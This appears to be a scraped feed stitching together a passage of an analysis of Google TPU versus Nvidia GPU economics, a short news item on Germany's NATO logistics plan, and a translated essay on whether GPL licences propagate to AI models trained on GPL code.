ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.The key thing to understand is that because the TPU doesn’t need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia’s InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn’t offer the flexibility that GPUs do.Performance numbers TPU vs GPU?As we defined the differences, let’s look at real numbers showing how the TPU performs compared to the GPU. Since Google isn’t revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.The first important thing is that there is very limited information on Google’s newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5pTPUv7 has 192GB of memory capacity vs TPUv5p 96GBTPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5pWe can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA & others), the summary of the results is as follows.Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.A Former Google Cloud employee:»If it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They’re also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.The use cases are slightly limited to a GPU, they’re not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.«Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:»TPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%«This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:»If I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google’s help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.Google has got a good promise so they keep supporting older TPUs and they’re making it a lot cheaper. If you don’t really need your model trained right away, if you’re willing to say, “I can wait one week,” even though the training is only three days, then you can reduce your cost 1/5.«Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:»I would expect that an AI accelerator could do about probably typically what we see in the industry. I’m using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.«We also got some numbers from a Former Google employee who worked in the chip segment:»When I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there’s a difference between a very custom design built to do one task perfectly versus a more general purpose design.«What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.A lot of people mention the problem that every Nvidia »competitor« like the TPU faces, which is the fast development of Nvidia and the constant »catching up« to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:»The amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia«In addition, the recent data from Google’s presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google’s TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a »special case«. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia’s official X account posted a screenshot of an article in which OpenAI denied plans to use Google’s in-house chips. To say the least, Nvidia is watching TPUs very closely.Ok, but after looking at some of these numbers, one might think, why aren’t more clients using TPUs?Where are the problems for the wider adoption of TPUsIt is also important to note that, until recently, the GenAI industry’s focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well – Gemini 3 the prime example).The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:»Right now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.I don’t know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.With TPUs, once you are all relied on TPU and Google says, “You know what? Now you have to pay 10X more,” then we would be screwed, because then we’ll have to go back and rewrite everything. That’s why. That’s the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon’s Trainium and Inferentia.«These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it’s not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 yearsThe most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia’s 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google’s TPU, followed by Amazon’s Trainum, and lastly Microsoft’s MAIA (although Microsoft owns the full IP of OpenAI’s custom ASICs, which could help them in the future).While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia’s but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.Recently, we even got comments from the SemiAnalysis team praising the TPU:How many TPUs does Google produce today, and how big can that get?Here are the numbers that I researched:]]></content:encoded></item><item><title>Germany Drafts Secret 1,200-Page War Plan to Rush 800,000 NATO Troops East</title><link>https://united24media.com/latest-news/germany-drafts-secret-1200-page-war-plan-to-rush-800000-nato-troops-east-13815</link><author>/u/pyramidworld</author><category>news</category><category>reddit</category><pubDate>Thu, 27 Nov 2025 13:22:25 +0000</pubDate><source url="https://www.reddit.com/r/worldnews/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - World News</source><content:encoded><![CDATA[Germany has drawn up a sweeping, classified 1,200-page wartime logistics plan detailing how NATO would surge up to 800,000 troops across German territory if Russia launched an attack on the alliance,  reported on November 27.The internal blueprint—known as “Operation Plan Germany” or OPLAN DEU—outlines the ports, rail networks, river routes, and highways that would serve as NATO’s main artery to the eastern front.Every article pushes back against disinformation.

While there were issues concerning conditions such as attribution required by most licenses, there was a particularly high volume of discourse suggesting that the conditions of copyleft licenses, such as the GNU General Public License (GNU GPL), would propagate to the model itself, necessitating that the entire model be released under the same license. The propagation of the GPL is a concept that many modern software engineers have naturally accepted; thus, for an engineer with a straightforward sensibility, it is a perfectly natural progression to think that if GPL code is included in some form, copyleft applies and the license propagates.However, as of 2025, the theory that the license of the source code propagates to AI models trained on Open Source code is not seen as frequently as it was back then. Although some ardent believers in software freedom still advocate for such theories, it appears they are being overwhelmed by the benefits of AI coding, which has overwhelmingly permeated the programming field. Amidst this trend, even I sometimes succumb to the illusion that such a theory never existed in the first place.Has the theory that the license of training code propagates to such AI models been completely refuted?Actually, it has not. This issue remains an indeterminate problem where lawsuits are still ongoing and the judgments of major national governments have not been made clear. In this article, I will explain the current situation of this license propagation theory, namely “GPL propagates to AI models trained on GPL code,” and connect it to points of discussion such as the legal positioning of models and the nature of the freedom we pursue in the AI domain.This article is an English translation of a post originally written in Japanese. While it assumes a Japanese reader, I believe it may also be useful for an English-speaking audience.The Current Standing in Two LawsuitsFirst, let us organize what the “GPL propagation theory to AI models” entails. This is the idea that when an AI model ingests GPL code as training data, the model itself constitutes a derivative work (derivative) of the GPL code; therefore, when distributing the model, the copyleft conditions of the GPL, such as the obligation to disclose source code, apply. In other words, it is not a question of whether the output of the model is similar to the GPL code, but a theory that “since the model itself is a derivative containing GPL code, the GPL extends to the model.” While there were many voices supporting this theory around 2021, as mentioned earlier, it is no longer the mainstream of the discussion today. However, two major ongoing lawsuits can be cited as grounds that this theory has not been completely denied. These are  (the Copilot class action) filed in the United States and  filed in Germany. I will explain the history and current status of each lawsuit below.Doe v. GitHub (Copilot Class Action): The Persisting Claim of Open Source License ViolationIn the Copilot class action filed at the end of 2022 in relation to GitHub Copilot, anonymous developers became plaintiffs and argued that GitHub, Microsoft, and OpenAI trained their models on source code from public repositories without permission, inviting massive license violations through Copilot. Specifically, they viewed it as problematic that when Copilot reproduces part of the code that served as the training source in its output, it does not perform the author attribution or copyright notice required by licenses such as MIT or Apache-2.0 at all, and furthermore, it indiscriminately trains on and outputs code under licenses that impose copyleft conditions like the GPL, thereby trampling on license clauses. The plaintiffs claimed this was a contractual violation of open source licenses and also sought damages and injunctions, asserting that it constituted a violation of the Digital Millennium Copyright Act (DMCA) under copyright law.In this case, several decisions have already been handed down by the United States District Court for the Northern District of California, and many of the plaintiffs’ claims have been dismissed. What were dismissed were mainly peripheral claims such as DMCA clause violations, privacy policy violations, unjust enrichment, and torts, but some DMCA violations and the claim of “violation of open source licenses” (breach of contract) are still alive. Regarding the latter specifically, the argument is that despite the plaintiffs’ code being published under licenses like GPL or MIT, the defendants failed to comply with the author attribution or the obligation to publish derivatives under the same license, which constitutes a contractual violation. Although the court did not recognize claims for monetary damages because the plaintiffs could not demonstrate a specific amount of damage, it determined that there were sufficient grounds for the claim for injunctive relief against the license violation itself. As a result, the plaintiffs are permitted to continue the lawsuit seeking an order prohibiting the act of Copilot reproducing others’ code without appropriate license indications.As is clear from the above history, “violation of open source licenses in training data” is still being contested in court in the Copilot litigation, and this is one of the reasons why the theory of license propagation to models has not been completely denied. The plaintiffs’ claim in this lawsuit does not directly demand the release of the model itself under the GPL, but it legally pursues the point that license conditions were ignored in the process of training and output; consequently, it suggests that “if the handling does not follow the license of the training data, the act of providing the model could be illegal.” Furthermore, the court has not clearly rejected this logic at this stage and has indicated a judgment that the use of open source code is accompanied by license obligations, and providing tools that ignore this could constitute a tort subject to injunction.However, it is necessary to note that the claims in the Copilot litigation are legally framed as breach of contract (license) or DMCA violation, and are not a direct copyright argument that “the model is a derivative work of GPL code.” No judgment has been shown stepping so far as to mandate the disclosure of the entire model under the GPL license. The actual judgment is conservative, stating “monetary damages have not been shown, but there is room for future injunctive relief,” and does not mention the obligation to disclose the model itself. In other words, at present, there is no judicial precedent directly addressing the “GPL propagation theory to models,” and the situation is one where the issue raised regarding license violation of the source code remains alive in the judicial arena.GEMA v. OpenAI: The Theory Treating “Memory” in Models as Legal ReproductionAnother important lawsuit is the case where the German music copyright collective GEMA sued OpenAI. This is a copyright lawsuit concerning the unauthorized training and output of lyrics by an AI model, not AI code generation, but it carries significant theoretical implications related to “license propagation to models” even if not directly related to GPL.In November 2025, the Munich I Regional Court handed down a judgment on this lawsuit, indicating regarding the matter where the ChatGPT model had memorized and reproduced the lyrics of 9 famous German songs, that the act of “memory” inside the model itself falls under the act of reproduction under copyright law. According to the judgment, the lyrics under the plaintiff’s management were “fixed” in the models of ChatGPT’s GPT-4 and 4o, and the situation was such that the lyrics were output almost verbatim just by the user giving a simple prompt. Based on this, the court determined that the model contains “parameters that memorized the work” internally, and if it is possible to reproduce an expression substantially identical to the original work for a human by means of an appropriate prompt, that memory itself falls under “reproduction” in Article 16 of the German Copyright Act. Furthermore, it determined that the act of actually outputting lyrics in response to a prompt is also a separate act of reproduction, and providing lyrics to the user falls under the act of making available to the public (public transmission). Also, it ruled that since all of these are done without the permission of the rights holder, they deviate from the scope justified by the TDM (Text and Data Mining) exception in the EU DSM Copyright Directive.The important point of this judgment is that it clearly acknowledged that “if a work is recorded inside the model in a reproducible form, that state itself can constitute copyright infringement.” The court cited the text of the EU InfoSoc Directive that “reproduction includes copies in any form or manner, and does not need to be directly perceptible to humans,” and stated that in the spirit of this, even if the lyrics are encoded within the model’s parameters, it amounts to the creation of a reproduction. It went as far as to mention that “encoding in the form of probabilistic weights does not prevent it from being considered a copy,” showing a strong recognition that differences in technical formats cannot avoid the nature of reproduction under copyright law. Also, since the fact that the model could output the lyrics was not coincidental but highly consistent, it was factually found that “the direct incorporation of the essential part of the training data” occurred rather than the result of statistical learning. As a result, the Munich District Court recognized OpenAI’s liability for injunction and damages regarding the output act of the lyrics in question, and further ordered the provision of information regarding training data and output content for the future. However, this judgment is the first instance, and since OpenAI has indicated an intention to appeal, it is expected to be a continuing dispute.The noteworthy theory shown by this GEMA judgment is the extension of the concept of reproduction under copyright law to the interior of the model. That is, if the work used as training data remains within the model and can be reproduced with a simple operation, it means the model already contains a reproduction of that work. This theory is groundbreaking in that it deems “the model contains the source work,” and indeed, in a commentary by Osborne Clarke, it is evaluated that “in contrast to the judgment of the English High Court in the  case, the Munich District Court explicitly recognized the possibility that the AI model contains copies of the training material.” Standing on this view, the model is not merely a result of analysis, but depending on the case, can be evaluated as an aggregate of the training data itself.However, it is necessary to keep in mind that this judgment is based on an extreme case where a complete match output was obtained with short text such as lyrics. The court itself stated, “Normally, temporary reproduction for learning remains within the purpose of analysis and does not infringe on the rights holder’s market, but in this case, the model holds the work in a restorable form and exceeds the scope of analysis,” emphasizing that the judgment is limited to “cases where the model performs complete reproduction.” Also, as the UK case shows, judicial decisions vary by country, and a legal consensus on this issue has not yet been formed.Nevertheless, the judgment this time, which declared that the recording of a work inside a model is a reproduction, can become a major basis supporting the license propagation theory. This is because, while the premise for discussing GPL propagation is “whether the model can be said to be a reproduction or derivative work of the GPL code,” the logic of the Munich District Court legally certified exactly that “a model can be a reproduction of training data”.Possibilities Derived from the Current Status of the Two LawsuitsFrom the two lawsuits above, we can consider the path through which the theory of license propagation to AI models might be recognized in the future.Let us assume the worst-case scenario from the perspective of AI operators, where these lawsuits are finalized with the plaintiffs winning. In the Copilot litigation, the judgment that “model providers must comply with the license conditions of the training source code” would be established, and in the GEMA litigation, the legal principle that “the model encompasses reproductions of the work” would be established. When these two intersect, the conclusion that “since an AI model containing GPL code is a reproduction or derivative work of the GPL code, the conditions of the GPL directly apply to its provision” is theoretically derived. That is, the possibility emerges that the theory of GPL propagation to models is effectively ratified by the judiciary.Specifically, if the model memorizes and contains GPL code fragments internally, the act of distributing or providing that model to a third party may be regarded as the distribution of a reproduction of GPL code; in that case, the act of distribution under conditions other than GPL would be evaluated as a GPL license violation. If a GPL violation is established, there would be room to argue for remedies such as injunctions and claims for damages, as well as forced GPL compliance demanding the disclosure of the entire model under the same license, just as in the case of ordinary software. In fact, the remedies GEMA sought from OpenAI included disclosure regarding training data and output content, and although this is in the context of musical works, this can be said to be a type of disclosure request to make transparent “what the model learned and contains.” In the case of a GPL violation as well, the possibility cannot be denied that demands such as “disclosure of the GPL code parts contained inside the model” or “source disclosure in a form that allows reconstruction of the model” would emerge in seeking license compliance.Even if not reaching such an extreme conclusion, an intermediate scenario could involve imposing certain restrictions on model providers. For example, the Copilot litigation might be settled or judged by taking measures such as “attaching a license and author attribution at the time of output if existing code of a certain length or more is included in the generated code,” or technically mandating the implementation of filters so that GPL code fragments are not extracted or reproduced from the model. In fact, GitHub, the developer of Copilot, has already introduced an optional feature that “excludes from suggestions if the candidate code matches existing code on large-scale repositories,” attempting to reduce litigation risk. Also regarding OpenAI, there are reports that it strengthened filters so that ChatGPT does not output copyrighted lyrics as they are, in response to the GEMA judgment.While these are not license propagation itself legally, in practice, they indicate that the industry is steering in the direction of “ensuring the model does not potentially infringe license conditions.” In the future, there is a possibility that guidelines for excluding data with specific license terms like GPL at the model training stage, or mechanisms and systems to guarantee that there is no license-infringing output by conducting output inspections after training, will be established.In any case, until these two lawsuits are completely settled and the subsequent legislative response is determined, the “theory of GPL propagation to models” has not completely disappeared. It is a scenario that could suddenly become realistic depending on future judgments, and even if the plaintiffs lose in the lawsuits, there is a possibility that support for this theory will reignite within the open source community. It is necessary to note that while it is currently an “undetermined theory not shouted as loudly as before,” that does not mean it has been legally completely denied and resolved. As our community, we need to carefully consider countermeasures while observing these trends and taking into account the legal systems of each country and opposing arguments described in the latter half of this article.Treatment under Japanese LawBased on the trends of the overseas lawsuits mentioned above, I will also organize the relationship between AI models, copyrighted works, and licenses under Japanese law. In Japan, Article 30-4 of the Copyright Act, introduced by the 2018 amendment, exists as a provision that comprehensively legalizes reproduction acts associated with machine learning. Furthermore, in March 2024, the Copyright Division of the Council for Cultural Affairs of the Agency for Cultural Affairs published a guideline-like document titled “Thought on AI and Copyright” (hereinafter “the Thought”), presenting a legal organization divided into the development/training stage and the generation/utilization stage of generative AI.According to “the Thought,” reproduction performed basically for the purpose of AI training is legal as long as it satisfies “information analysis not for the purpose of enjoying the thoughts or sentiments expressed in the work” as defined in Article 30-4. Therefore, acts of collecting and reproducing a wide range of data from the internet to create a training dataset for research and development purposes can be done without the permission of the rights holders in principle. However, what is important is whether an “purpose of enjoyment” is mixed into that training act. “The Thought” states that if training is conducted with the purpose of “intentionally reproducing all or part of the creative expression of a specific work in the training data as the output of generative AI,” it is evaluated as having a concurrent purpose of enjoying the work rather than mere information analysis, and thus lacks the application of Article 30-4. As a typical example of this, “overfitting” is cited, and acts such as making a model memorize specific groups of works through additional training to cause it to output something similar to those works are judged to have a purpose of enjoyment.Furthermore, “the Thought” also mentions the legal treatment of trained models, stating first that “trained models created by AI training cannot be said to be reproductions of the works used for training in many cases.” This is the view that since the model can generate outputs unrelated to the original in response to various inputs in a general-purpose manner, the model itself is not a copy of any specific work.However, “the Thought” simultaneously acknowledges the possibility that, exceptionally, in cases where “the trained model is in a state of generating products with similarity to the work that was training data with high frequency,” the creative expression of the original work remains in the model, and it may be evaluated as a reproduction. It also points out that in such cases, the model is positioned as a machine for copyright infringement, and a claim for injunction may be recognized. In short, usually the model is merely statistical data and not the work itself, but if it has turned into a device for spewing out specific works almost as they are, it can be treated as an infringing item; this thinking shares parts with the content of the GEMA judgment.It is necessary to note that the above organization is strictly a discussion of the scope of application of rights limitation provisions (exception provisions) under the Copyright Act, and does not touch upon the validity of contracts or license clauses. The Agency for Cultural Affairs document discusses from the perspective of “whether it is copyright infringement or not,” and does not deny that even if the training act is legal, contractual liability may arise if it violates terms of service or open source licenses separately. Also, no in-depth view has been shown regarding the propagation of copyleft clauses like the GPL. In Japan’s Copyright Act, there is no override provision where rights limitation provisions like Article 30-4 take precedence over contract conditions, and the “Contract Guidelines on Utilization of AI and Data” by the Ministry of Economy, Trade and Industry suggests the possibility that if there is a contract prohibiting data use between parties, that contract takes precedence.Therefore, if the license is regarded as a valid contract, even if “training is legal” under Article 30-4 of the Copyright Act, the risk remains that it becomes a “violation of license conditions” under contract law, and it can be said that at least there is no official view organizing the theory of GPL propagation to models. In other words, currently, while the legality of model training acts is recognized quite broadly under the Copyright Act, license violation is left to general civil theory, and there is no clear guideline on, for example, “whether the act of publicly distributing a model trained on GPL code constitutes a GPL license violation.” Overall, the legal organization in Japan is in a situation of “safe in principle at the copyright layer, but blank at the contract layer.” Hence, the discussion in Japan regarding the theory of GPL propagation to models relies on future judicial judgments and legislative trends, and at present, there is no choice but to consider operational guidelines carefully following the organization by the Agency for Cultural Affairs.Arguments Negating the Theory of License Propagation to ModelsAs seen in the previous sections, the theory of GPL propagation to models is not legally zero. However, many legal experts and engineers point out that this theory has serious detrimental effects. Here, I present representative arguments negating the theory of license propagation to models from the layers of copyright law, GPL text, technology, and practical policy.Arguments for Negation at the Copyright Law LayerFirst, under copyright law, it is unreasonable to regard an AI model as a “derivative work” or “reproduction” of the training source works. In many cases, the expressions of specific works are not stored inside the model in a form recognizable to humans. The model merely holds statistical abstractions where text and code have been converted into weight parameters, and that itself is not a creative expression to humans at all. A “derivative work” under copyright law refers to a creation that incorporates the essential features of the expression of the original work in a form that can be directly perceived, but one cannot directly perceive the creativity of the original code from the model’s weights. In other words, the model does not show the nature of a work directly enough to be evaluated as encompassing the original code. For example, the High Court of Justice in the UK stated in the judgment of the  case that “the Stable Diffusion model itself is not an infringing copy of the training images,” showing a negative view on regarding the model itself as a reproduction of works. Thus, there are many cautious positions internationally regarding regarding the model itself as an accumulation of works or a compilation work.Also, the output generated by the model involves probabilistic and statistical transformations, and in many cases, things that do not resemble the training source at all are output. Even if a match or similarity occurs by chance, it is difficult to prove whether it is a reproduction relying on the original or an accidental similarity. It is not realistic to conduct the certification of reliance and similarity required to discuss copyright infringement for the entire model. Ultimately, in the framework of copyright law, there is no choice but to judge “whether the model relies on a specific work” on a work-by-work basis, and recognizing uniform copyrightability or infringing nature for the model itself is a large leap. As organized in Japanese law where the model is not considered a reproduction in most cases, the schematic of model equals work is considered unreasonable under copyright law.Arguments for Negation at the GPL Text LayerNext, looking at the license text and intent of the GPL itself, doubts are cast on the interpretation that GPL propagates to AI models. For example, in the text of GPLv2, the target of copyleft is limited to “derivative works” of the original code provided under GPL and “works that contain the Program.” Typically, this has been interpreted as software created by modifying or incorporating GPL code, or software combined (linked) with GPL code. In the case of an AI model, it is extremely unclear which part of the original GPL code the model “contains.” Even if the model could memorize fragments of the GPL code used for training, it is a tiny fraction when viewed from the entire model, and most parts are occupied by parameters unrelated to the GPL code. There is no clear assumption shown by the GPL drafters as to whether a statistical model that may partially encapsulate information derived from GPL code can be said to be “a work containing the Program”.Furthermore, GPLv3 requires the provision of software source code in a “preferred form for modification.” If an AI model is a GPL derivative, the problem arises as to what that preferred form for modification would be. The model weights themselves have low readability and editability for humans, and are hard to call a “preferred form for modification.” If we ask whether the training data is the source code, the original trained GPL code itself cannot be said to be the source of the model, nor is it clear if it refers to the entire vast and heterogeneous training dataset. It is difficult to define what should be disclosed to redistribute the model under GPL compliance, and it could lead to an extreme conclusion that all code and data used for model training must be disclosed. While this is what some freedom believers aim for, it can only be said to be unrealistic in reality, and it deviates from the point of the GPL’s intent to enable users to modify and build from source. Thus, existing GPL provisions are not designed to directly cover products like AI models, and forcing their application causes discrepancies in both text and operation.In fact, in the “Open Source AI Definition” compiled by the OSI (Open Source Initiative) in 2023, regarding “information necessary for modification” of the model, it stopped at stating that sufficiently detailed information about the training data should be disclosed, and did not require the provision of the training data itself in its entirety. Also, it states that model weights and training code should be published under OSI-approved licenses.In addition, the FSF (Free Software Foundation) itself does not believe that the current GPL interpretation alone can guarantee freedom in the AI domain, and announced in 2024 that it has started formulating “conditions for machine learning applications to be free.” There, the directionality is shown that “the four freedoms should be guaranteed to users including not only software but also raw training data and model parameters,” but this conversely is a recognition that this is not guaranteed under current licenses. The FSF also points out that “since model parameters cannot be said to be source comprehensible to humans, modification through retraining is more realistic than direct editing,” and can be said to be cautious about treating models on the extension of existing GPL. Overall, claiming GPL propagation univocally to AI models that fall outside the wording and assumptions of GPL provisions is unreasonable from the perspective of interpretation.Arguments for Negation at the Technical LayerThere are also strong counterarguments from a technical perspective against the theory of GPL propagation to models. AI models, particularly those called large language models, basically hold huge statistical trends internally and do not store the original code or text as they are like a database. Returning a specific output for a specific input is merely generation according to a probability distribution, and it is not guaranteed that the same output as the training data is always obtained. If the model does not perform verbatim reproduction of training data except for a very small number of exceptional cases, evaluating it as “containing GPL code” within the model does not fit the technical reality. In fact, the OpenAI side argued in the GEMA lawsuit that “the model does not memorize individual training data, but merely reflects knowledge learned from the entire dataset in parameters.” This argument was not accepted by the Munich District Court, but that was because there was a clear example of lyric reproduction; conversely, unless there is a clear example of reproduction, the view would be that “the model is a lump of statistical knowledge”.Furthermore, although it has been confirmed that models can output fragments of training data, that proportion is considered extremely limited when viewed from the whole. Regarding the whole as a reproduction based on the existence of partial memory is like claiming the whole is a reproduction of a photograph just because it contains a tiny mosaic-like fragment in an image, which is an excessive generalization. Technically, it is difficult to quantitatively measure how far specific parameters of the model retain the influence of the original data, and the correspondence between the model and training data remains statistical and difficult to draw a line. Therefore, criteria such as “how similar must it be for GPL to propagate?” cannot be established in the first place. The judgment of infringement or not has to be done on an individual output basis, and this would not be consistent with the idea of applying a single license to the entire model. From the technical aspect, since the model is basically a statistical transformation and the majority is unrelated to GPL code, applying GPL collectively can be said to be irrational.Practical and Policy Arguments for NegationFinally, major demerits can be pointed out regarding the theory of license propagation to models from practical and policy perspectives. What would happen if this GPL propagation theory were legally recognized? As an extreme example, if 1 million code repositories were used for training a certain large-scale model, all the various licenses contained in them (GPL, MIT, Apache, proprietary, etc.) would “propagate” to the model, and the model provider would have to distribute the model in a form that complies with all 1 million license clauses. As a practical matter, there would be combinations where conditions contradict, such as GPLv2 and Apache-2.0, and attaching and managing a huge collection of copyright notices for one model is nothing but unrealistic. Applying all licenses to an AI model created from training data with mixed licenses is practically bankrupt, and eventually, the only thing that can be done to avoid it would be to exclude code with copyleft licenses like GPL from the training data from the start.Is such a situation really desirable for our community? The spirit of the GPL is to promote the free sharing and development of software. However, if asserting excessive propagation to AI models causes companies to avoid using GPL code, and as a result, the value held by GPL software is not utilized in the AI era, it would be putting the cart before the horse. In the field of software development, many companies take a policy of not mixing GPL code into their own products, but similarly, if it becomes “do not include GPL in our AI training data,” GPL projects could lose value as data sources. Furthermore, the current legal battles surrounding AI are leaning more towards monetary compensation and regulatory rule-making, and the reality is that they are proceeding in a different vector from the direction of code sharing idealized by GPL. If only the theory of GPL propagation to models walks alone, in reality, only data exclusion and closing off to avoid litigation risks will progress, and there is a fear that it will not lead to the expansion of free software culture.Policy-wise as well, governments of each country are carefully considering the use of copyrighted works in AI, but at present, there is no example establishing an explicit rule that “license violation of training data generates legal liability for the model.” Even in the EU AI Act, while there are provisions regarding the quality and transparency of training data, it does not demand compliance with open source licenses. Rather, from the perspective of promoting open science and innovation, the movement to allow text and data mining under rights limitations is strong. In Japan as well, as mentioned earlier, the direction is to broadly recognize information analysis use under Article 30-4, and the policy of forcibly applying licenses to AI models is not mainstream in current international discussions.Based on the above, the theory of license propagation to models is highly likely to cause disadvantages to open source on both practical and policy fronts, and can be said not to be a realistic solution. What is important is how to realize the “freedom of software,” which is the philosophy of open source, in the AI era; the opinion that this should be attempted through realistic means such as ensuring transparency and promoting open model development rather than extreme legal interpretations is potent, and this is something I have consistently argued as well.The Stance of OSI and FSFI will also organize what stance major organizations in the open source (and free software) community are currently taking in relation to the theory of GPL propagation to AI models. Representative organizations are the Open Source Initiative (OSI) and the Free Software Foundation (FSF); while they share the goal of software freedom, they do not necessarily take the same approach regarding AI models and training data.First, the OSI formulated the “Open Source AI Definition” (OSAID) in 2024, defining the requirements for an AI system to be called open source. This definition states that the four freedoms (use, study, modify, redistribute) similar to software should be guaranteed for AI systems as well, and defines requirements regarding “forms necessary for modification” to realize that, requiring the disclosure of the following three elements.Data Information: Provide sufficiently detailed information about the data used for training so that a skilled person can reconstruct an equivalent model.
